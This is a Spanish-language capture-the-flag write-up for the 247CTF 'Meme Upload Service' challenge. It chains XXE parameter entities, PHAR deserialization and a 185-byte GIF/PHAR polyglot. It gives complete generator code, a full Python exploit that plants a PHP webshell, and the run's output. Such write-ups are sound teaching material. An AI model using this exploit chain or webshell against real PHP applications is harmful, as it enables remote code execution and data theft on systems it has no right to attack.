# Meme Upload Service - 247CTF Writeup

## Informacion del Reto

- **Plataforma**: 247CTF
- **Categoria**: Web Exploitation
- **Tecnicas**: XXE, PHAR Deserialization, Polyglot Files
- **URL**: https://776fd06a930ec85d.247ctf.com/
- **Flag**: `247CTF{0073c38dXXXXXXXXXXXXXXXXccc5668f}`

---

## Analisis del Codigo Fuente

### index.php

```php
<?php

class Message
{
    public function __construct($to, $from, $image)
    {
        $this->to = $to;
        $this->from = $from;
        $this->image = $image;
        $this->filePath = tempnam("/tmp/messages/", "") . ".txt";
    }

    public function __destruct()
    {
        file_put_contents($this->filePath, sprintf(
            "Hey %s! Take a look at this meme: %s! - %s",
            $this->to,
            $this->from,
            $this->image,
        ));
    }
}

if (isset($_POST["message"])) {
    $msgXml = new DOMDocument();
    $msgXml->loadXML($_POST["message"], LIBXML_DTDLOAD);
    if ($msgXml->schemaValidate("valid_message.xsd")) {
        $msgObj = new Message(
            $msgXml->getElementsByTagName("to")[0]->nodeValue,
            $msgXml->getElementsByTagName("from")[0]->nodeValue,
            $msgXml->getElementsByTagName("image")[0]->nodeValue
        );
        echo sprintf("Message stored %s!", $msgObj->filePath);
    } else {
        echo "Invalid XML!";
    }
} else if (isset($_FILES["image"])) {
    $imageTmp = $_FILES["image"]["tmp_name"];
    $imageSize = $_FILES["image"]["size"];
    $imageExt = strtolower(pathinfo($_FILES["image"]["name"], PATHINFO_EXTENSION));
    $imageMime = mime_content_type($imageTmp);
    $allowedExt = array("jpg", "jpeg", "gif", "png");
    $allowedMime = array("image/jpeg", "image/gif", "image/png");
    if (in_array($imageExt, $allowedExt) === false)
        die("Invalid extension!");
    if (in_array($imageMime, $allowedMime) === false)
        die("Invalid mime type!");
    if (getimagesize($imageTmp) === false || $imageSize > 185)
        die("Invalid size!");
    $uploadPath = tempnam("/tmp/images/", "") . "." . $imageExt;
    move_uploaded_file($imageTmp, $uploadPath);
    echo sprintf("Image uploaded %s!", $uploadPath);
} else {
    echo highlight_file(__FILE__, true);
}
```

### valid_message.xsd

```xml
<xs:schema attributeFormDefault="unqualified" elementFormDefault="qualified"
           xmlns:xs="http://www.w3.org/2001/XMLSchema">
<xs:element name="message">
  <xs:complexType>
    <xs:sequence>
      <xs:element name="to" minOccurs="1" maxOccurs="1"/>
      <xs:element name="from" minOccurs="1" maxOccurs="1"/>
      <xs:element name="image" minOccurs="1" maxOccurs="1"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
</xs:schema>
```

---

## Identificacion de Vulnerabilidades

### 1. XXE con LIBXML_DTDLOAD

La funcion `loadXML()` usa el flag `LIBXML_DTDLOAD`:

```php
$msgXml->loadXML($_POST["message"], LIBXML_DTDLOAD);
```

Este flag permite cargar DTDs externos especificados en el DOCTYPE. Aunque no se usa `LIBXML_NOENT` (que expandiria entidades generales como `&xxe;`), las **parameter entities** (`%xxe;`) SI se procesan durante la carga del DTD.

### 2. Gadget de Deserializacion en la Clase Message

La clase `Message` tiene un metodo `__destruct()` que escribe contenido controlable a un archivo:

```php
public function __destruct()
{
    file_put_contents($this->filePath, sprintf(
        "Hey %s! Take a look at this meme: %s! - %s",
        $this->to,
        $this->from,
        $this->image,
    ));
}
```

Si controlamos `$this->filePath` y `$this->to`, podemos escribir codigo PHP arbitrario.

### 3. Upload de Imagenes con Limite de 185 Bytes

El sistema permite subir imagenes con restricciones:
- Extension: jpg, jpeg, gif, png
- MIME type: image/jpeg, image/gif, image/png
- `getimagesize()` debe retornar verdadero
- Tamano maximo: **185 bytes**

---

## Estrategia de Explotacion

### Cadena de Ataque

1. Crear un archivo PHAR polyglot que:
   - Pase como imagen GIF valida (magic bytes, mime, getimagesize)
   - Contenga metadata serializada con un objeto `Message` malicioso
   - Sea menor o igual a 185 bytes

2. Subir el PHAR polyglot como imagen GIF

3. Enviar XML con parameter entity XXE apuntando a `phar:///tmp/images/archivo.gif`

4. Cuando libxml carga el "DTD" via `phar://`, PHP deserializa la metadata del PHAR

5. El objeto `Message` deserializado ejecuta `__destruct()` al ser destruido, escribiendo un webshell

6. Acceder al webshell para obtener la flag

### Por que Parameter Entities y no General Entities

Con solo `LIBXML_DTDLOAD` (sin `LIBXML_NOENT`):

- **General entities** (`&xxe;`): NO se expanden en el contenido del documento
- **Parameter entities** (`%xxe;`): SI se procesan dentro del DTD

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "phar:///tmp/images/file.gif">
  %xxe;
]>
```

Cuando el parser encuentra `%xxe;` en el DTD interno, intenta cargar el recurso SYSTEM, lo que dispara el wrapper `phar://`.

---

## Construccion del PHAR Polyglot

### El Problema: 185 Bytes

Un PHAR generado normalmente con la API de PHP tiene aproximadamente 197 bytes minimos, superando el limite. La solucion es construir el PHAR manualmente optimizando cada byte.

### Estructura del PHAR

```
[STUB][MANIFEST_LENGTH][MANIFEST][FILE_CONTENTS][SIGNATURE][SIG_TYPE][MAGIC]
```

Componentes:
- **Stub**: Codigo PHP que termina en `__HALT_COMPILER();`
- **Manifest**: Metadatos del archivo (numero de archivos, version API, metadata serializada)
- **Signature**: Hash SHA1 del contenido (20 bytes)
- **Magic**: `GBMB` (4 bytes)

### Optimizaciones Aplicadas

1. **Stub minimo con magic GIF**: `GIF8__HALT_COMPILER(); ?>\r\n` (27 bytes)
   - `GIF8` es suficiente para que `mime_content_type()` detecte `image/gif`
   - `getimagesize()` interpreta los bytes siguientes como dimensiones (valores grandes pero validos)

2. **Archivo interno minimo**: nombre `0`, contenido vacio

3. **Metadata optimizada**: Solo propiedades necesarias (`to` y `filePath`)

4. **Payload compacto**: `` <?=`cat /tmp/*`?> `` (17 caracteres)

### Codigo de Generacion

```php
<?php
class Message { public $to; public $filePath; }

$m = new Message;
$m->filePath = "z.php";
$m->to = "<?=`cat /tmp/*`?>";
$metadata = serialize($m);

// Stub que pasa como GIF
$stub = "GIF8__HALT_COMPILER(); ?>\r\n";

// Archivo interno
$filename = "0";
$filecontent = "";

// Construir manifest
$manifest = "";
$manifest .= pack("V", 1);                    // Num files: 1
$manifest .= pack("v", 0x0011);               // API version
$manifest .= pack("V", 0x00010000);           // Flags: has signature
$manifest .= pack("V", 0);                    // Alias length: 0
$manifest .= pack("V", strlen($metadata));    // Metadata length
$manifest .= $metadata;                       // Metadata serializada

// File entry
$manifest .= pack("V", strlen($filename));    // Filename length
$manifest .= $filename;                       // Filename
$manifest .= pack("V", strlen($filecontent)); // Uncompressed size
$manifest .= pack("V", 0);                    // Timestamp
$manifest .= pack("V", strlen($filecontent)); // Compressed size
$manifest .= pack("V", crc32($filecontent));  // CRC32
$manifest .= pack("V", 0x000001A4);           // Flags (permisos)
$manifest .= pack("V", 0);                    // Per-file metadata length

// Ensamblar PHAR
$phar_data = $stub;
$phar_data .= pack("V", strlen($manifest));   // Manifest length
$phar_data .= $manifest;
$phar_data .= $filecontent;

// Firma SHA1
$sig_data = hash("sha1", $phar_data, true);
$phar_data .= $sig_data;
$phar_data .= pack("V", 0x0002);              // Signature type: SHA1
$phar_data .= "GBMB";                         // Magic

file_put_contents("exploit.phar", $phar_data);
// Tamano final: 185 bytes exactos
```

### Verificacion del PHAR

```
$ xxd exploit.phar
00000000: 4749 4638 5f5f 4841 4c54 5f43 4f4d 5049  GIF8__HALT_COMPI
00000010: 4c45 5228 293b 203f 3e0d 0a7e 0000 0001  LER(); ?>..~....
00000020: 0000 0011 0000 0001 0000 0000 004f 0000  .............O..
00000030: 004f 3a37 3a22 4d65 7373 6167 6522 3a32  .O:7:"Message":2
00000040: 3a7b 733a 323a 2274 6f22 3b73 3a31 373a  :{s:2:"to";s:17:
00000050: 223c 3f3d 6063 6174 202f 746d 702f 2a60  "<?=`cat /tmp/*`
00000060: 3f3e 223b 733a 383a 2266 696c 6550 6174  ?>";s:8:"filePat
00000070: 6822 3b73 3a35 3a22 7a2e 7068 7022 3b7d  h";s:5:"z.php";}
00000080: 0100 0000 3000 0000 0000 0000 0000 0000  ....0...........
00000090: 0000 0000 00a4 0100 0000 0000 00[SHA1..]
000000b0: [............]02 0000 0047 424d 42      .....GBMB
```

---

## Exploit Completo

```python
#!/usr/bin/python3
import requests
import urllib.parse
import re

RHOST = "776fd06a930ec85d.247ctf.com"

# PHAR polyglot de 185 bytes (pre-generado)
def generate_phar():
    # Metadata serializada
    metadata = b'O:7:"Message":2:{s:2:"to";s:17:"<?=`cat /tmp/*`?>";s:8:"filePath";s:5:"z.php";}'

    stub = b"GIF8__HALT_COMPILER(); ?>\r\n"
    filename = b"0"
    filecontent = b""

    import struct
    import hashlib

    # Manifest
    manifest = b""
    manifest += struct.pack("<I", 1)                      # Num files
    manifest += struct.pack("<H", 0x0011)                 # API version
    manifest += struct.pack("<I", 0x00010000)             # Flags
    manifest += struct.pack("<I", 0)                      # Alias length
    manifest += struct.pack("<I", len(metadata))          # Metadata length
    manifest += metadata

    # File entry
    manifest += struct.pack("<I", len(filename))
    manifest += filename
    manifest += struct.pack("<I", len(filecontent))       # Uncompressed
    manifest += struct.pack("<I", 0)                      # Timestamp
    manifest += struct.pack("<I", len(filecontent))       # Compressed
    import binascii
    manifest += struct.pack("<I", binascii.crc32(filecontent) & 0xffffffff)
    manifest += struct.pack("<I", 0x000001A4)             # Flags
    manifest += struct.pack("<I", 0)                      # Per-file meta

    # Assemble
    phar = stub
    phar += struct.pack("<I", len(manifest))
    phar += manifest
    phar += filecontent

    # SHA1 signature
    sig = hashlib.sha1(phar).digest()
    phar += sig
    phar += struct.pack("<I", 0x0002)
    phar += b"GBMB"

    return phar

print("[*] Generating PHAR polyglot...")
phar_data = generate_phar()
print(f"    Size: {len(phar_data)} bytes")

print("[*] Uploading as GIF...")
files = {"image": ("exploit.gif", phar_data, "image/gif")}
r = requests.post(f"https://{RHOST}", files=files)
print(f"    Response: {r.text}")

if "Invalid" in r.text:
    print("[-] Upload failed")
    exit(1)

img_path = r.text.strip().rstrip("!").split("/")[-1]
print(f"    Uploaded: {img_path}")

print("[*] Sending XXE payload...")
xml = f'''<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY % xxe SYSTEM "phar:///tmp/images/{img_path}">
  %xxe;
]>
<message><to>x</to><from>y</from><image>z</image></message>'''

r = requests.post(f"https://{RHOST}", data={"message": xml})
print(f"    Response: {r.text}")

print("[*] Accessing webshell...")
r = requests.get(f"https://{RHOST}/z.php")
print(f"    Status: {r.status_code}")
print(f"    Content: {r.text}")

flag = re.search(r"247CTF\{[0-9a-f]{32}\}", r.text)
if flag:
    print(f"\n[+] FLAG: {flag[0]}")
```

---

## Ejecucion

```
$ python3 exploit.py
[*] Generating PHAR polyglot...
    Size: 185 bytes
[*] Uploading as GIF...
    Response: Image uploaded /tmp/images/oG85DY.gif!
    Uploaded: oG85DY.gif
[*] Sending XXE payload...
    Response: Message stored /tmp/messages/1Z0TYH.txt!
[*] Accessing webshell...
    Status: 200
    Content: Hey 247CTF{0073c38dXXXXXXXXXXXXXXXXccc5668f}
! Take a look at this meme: ! -

[+] FLAG: 247CTF{0073c38dXXXXXXXXXXXXXXXXccc5668f}
```

---

## Aprendizaje del reto

1. **LIBXML_DTDLOAD sin LIBXML_NOENT**: Las parameter entities (`%xxe;`) se procesan aunque las general entities (`&xxe;`) no se expandan.

2. **PHAR Deserialization**: El wrapper `phar://` deserializa la metadata automaticamente al acceder al archivo, sin necesidad de llamar a `unserialize()` explicitamente.

3. **Polyglot Files**: Los archivos PHAR permiten prefijos arbitrarios en el stub, lo que facilita crear polyglots que pasen validaciones de tipo de archivo.

4. **Limites de Tamano como Defensa**: El limite de 185 bytes fue disenado para dificultar la creacion de PHARs validos, pero con construccion manual y optimizacion se puede lograr.

5. **Gadgets en __destruct**: Los metodos magicos como `__destruct()` son vectores comunes para explotar deserializacion insegura.

---

## Referencias

- [PHP PHAR Format Specification](https://www.php.net/manual/en/phar.fileformat.php)
- [BlackHat 2018 - It's a PHP Unserialization Vulnerability Jim, but Not as We Know It](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
